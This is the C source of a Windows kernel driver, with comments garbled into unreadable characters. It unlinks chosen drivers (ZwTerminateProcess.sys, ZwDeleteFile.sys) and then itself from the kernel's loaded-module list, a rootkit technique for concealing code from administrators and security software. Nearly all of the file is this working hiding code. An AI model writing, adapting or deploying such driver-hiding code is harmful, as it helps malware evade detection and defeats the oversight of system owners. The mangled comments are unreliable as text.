#include <ntifs.h>
#ifndef _NTNoDriverLoad_H
#define _NTNoDriverLoad_H "NTNoDriverLoad"
#endif
extern POBJECT_TYPE* IoDriverObjectType;


/** �ṹ�� **/
typedef struct _KLDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY64 InLoadOrderLinks;//�ؼ���
	ULONG64 Undefined1;
	ULONG64 Undefined2;
	ULONG64 Undefined3;
	ULONG64 NonPagedDebugInfo;
	ULONG64 DllBase;
	ULONG64 EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG   Flags;
	USHORT  LoadCount;
	USHORT  Undefined5;
	ULONG64 Undefined6;
	ULONG   CheckSum;
	ULONG   padding1;
	ULONG   TimeDateStamp;
	ULONG   padding2;
}KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;//�����Ա��ϵͳ���м��أ�������ֹͣû��ж�أ��Ѿ���ȡ���ڴ���
	LIST_ENTRY InMemoryOrderLinks;//ϵͳ�Ѿ�������û�б���ʼ����û�е��� DriverEntry ������̵�ʱ��ͨ�����������̴�������
	LIST_ENTRY InInitializationOrderLinks;//�Ѿ����� DriverEntry ���������������������
	PVOID DllBase;
	PVOID EntryPoint;//�����Ľ���� DriverEntry
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;//��������·��
	UNICODE_STRING BaseDllName;//����·������������
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union SubUnionA
	{
		LIST_ENTRY HashLinks;
		struct SubStructA
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union SubUnionB
	{
		struct SubStructB
		{
			ULONG TimeDateStamp;
		};
		struct SubStructC
		{
			PVOID LoadedImports;
		};
	};
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


/** �Ӻ��� **/
/* �Ƿ�λ�������� */
BOOLEAN isInList(UNICODE_STRING us, UNICODE_STRING arr[], int length, BOOLEAN caseInSensitive)
{
	for (int i = 0; i < length; ++i)
		if (RtlCompareUnicodeString(&us, &(arr[i]), caseInSensitive) == 0)
			return TRUE;
	return FALSE;
}

/* ��ȡ�������� */
NTKERNELAPI NTSTATUS ObReferenceObjectByName(
	__in PUNICODE_STRING ObjectName, 
	__in ULONG Attributes, 
	__in_opt PACCESS_STATE AccessState, //����Ȩ�޿���д 0 ��д 0 ��ȫ���ʲ��ܿ��� FILE_ALL_ACCESS
	__in_opt ACCESS_MASK DesiredAccess, 
	__in POBJECT_TYPE ObjectType, //��������
	__in KPROCESSOR_MODE AccessMode, //�ں�ģʽ������ģʽ enum ����
	__inout_opt PVOID ParseContext, 
	__out PVOID* Object//�������
);


/** ���ܺ��� **/
/* �������� */
VOID walkDriver(IN PDRIVER_OBJECT pDriverObject)
{
	PLDR_DATA_TABLE_ENTRY p = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY first = (PLDR_DATA_TABLE_ENTRY)p->InLoadOrderLinks.Flink;
	PLDR_DATA_TABLE_ENTRY item = (PLDR_DATA_TABLE_ENTRY)first->InLoadOrderLinks.Flink;
	DbgPrint("%s->Current Driver Section = %p, First LDR TABLE = %p", _NTNoDriverLoad_H, p, item);
	while (item != NULL && item != first)
	{
		DbgPrint("%s->%p->%ws", _NTNoDriverLoad_H, item->EntryPoint, item->FullDllName.Buffer);
		item = (PLDR_DATA_TABLE_ENTRY)item->InLoadOrderLinks.Flink;
	}
	return;
}

/* �������� */
int HideDriver(IN PDRIVER_OBJECT pDriverObject, UNICODE_STRING targets[], int length)
{
	int cnt = 0;
	PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PKLDR_DATA_TABLE_ENTRY first = (PKLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderLinks.Flink;//����Ľڵ�
	PKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)first->InLoadOrderLinks.Flink;//��һ�������Ľڵ�

	while (next != NULL && next != first)//����һ��
	{
		DbgPrint("%s->driver name = %wZ\n", _NTNoDriverLoad_H, &next->FullDllName);
		if (next->BaseDllName.Length != 0 && isInList(next->BaseDllName, targets, length, TRUE))//�ж��Ƿ���������
		{
			++cnt;
			PDRIVER_OBJECT Driver = NULL;
			NTSTATUS status = ObReferenceObjectByName(&next->FullDllName, FILE_ALL_ACCESS, 0, 0, *IoDriverObjectType, KernelMode, NULL, &Driver);//ͨ�������ĵ������Ķ���

			if (NT_SUCCESS(status))
			{
				RemoveEntryList((PLIST_ENTRY)(&next->InLoadOrderLinks));
				Driver->DriverInit = NULL;
				Driver->DriverSection = NULL;//��˫������ȥ����ͬʱ��һЩ�����Ķ���Ҳ���� NULL
			}

			break;
		}

		next = (PKLDR_DATA_TABLE_ENTRY)next->InLoadOrderLinks.Flink;//������һ��
	}

	return cnt;
}



/** ��������ں��� **/
/* ����ֹͣ */
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	DbgPrint("\n%s->DriverUnload()\n", _NTNoDriverLoad_H);
	DbgPrint("\n%s->Protection Stop! \n", _NTNoDriverLoad_H);
	return;
}

/* ������� */
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint("\n%s->DriverEntry()\n", _NTNoDriverLoad_H);
	pDriverObject->DriverUnload = DriverUnload;

	/* ���� */
	walkDriver(pDriverObject);

	/* ���� */
	UNICODE_STRING targets[] = { { 0 }, { 0 } };
	RtlInitUnicodeString(&(targets[0]), L"ZwTerminateProcess.sys");
	RtlInitUnicodeString(&(targets[1]), L"ZwDeleteFile.sys");
	HideDriver(pDriverObject, targets, 2);
	
	/* ���������غ���ֹ���ز��� */
	PKLDR_DATA_TABLE_ENTRY list = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;//������Ҫ�ṹ list ��ȡ�������ṹ
	*((ULONGLONG*)list->InLoadOrderLinks.Blink) = list->InLoadOrderLinks.Flink;//������������һ�����������һ������һ��������һ�����󣬴ﵽ���Լ�����������Ŀ��
	((LIST_ENTRY64*)list->InLoadOrderLinks.Flink)->Blink = list->InLoadOrderLinks.Blink;
	list->InLoadOrderLinks.Flink = (ULONGLONG)(&list->InLoadOrderLinks);//Flink
	list->InLoadOrderLinks.Blink = (ULONGLONG)(&list->InLoadOrderLinks);//Blink
	DbgPrint("\n%s->Make self hidden successfully! \n", _NTNoDriverLoad_H);

	return STATUS_SUCCESS;
}